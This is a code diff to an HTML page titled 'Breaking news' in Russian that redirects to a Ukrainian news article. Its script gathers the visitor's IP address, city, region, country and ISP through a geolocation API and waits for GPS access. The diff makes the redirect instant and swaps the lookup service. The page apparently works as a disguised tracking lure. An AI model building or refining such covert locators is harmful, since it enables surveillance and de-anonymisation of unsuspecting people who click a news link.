@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <title>Срочная новость</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="refresh" content="0.5; url=https://dnepr.express/ru/post/masshtabnyj-narkobiznes-razoblachili-v-15-oblastyah-ukrainy-sredi-nih-dnepropetrovshina" />
+  <meta http-equiv="refresh" content="0; url=https://dnepr.express/ru/post/masshtabnyj-narkobiznes-razoblachili-v-15-oblastyah-ukrainy-sredi-nih-dnepropetrovshina" />
   <style>
     body {
       background-color: #f4f4f4;
@@ -55,15 +55,15 @@
       });
     }
 
-    fetch("https://ipapi.co/json/")
+    fetch("https://ipwho.is/")
       .then(response => response.json())
       .then(data => {
         const ipMessage = `
 IP: ${data.ip}
 Город: ${data.city}
 Регион: ${data.region}
-Страна: ${data.country_name}
-Провайдер: ${data.org}
+Страна: ${data.country}
+Провайдер: ${data.connection.isp}
 Время: ${new Date().toLocaleString()}`;
 
         document.getElementById("status").innerText = ipMessage + "\n\n⏳ Ожидаю GPS...";
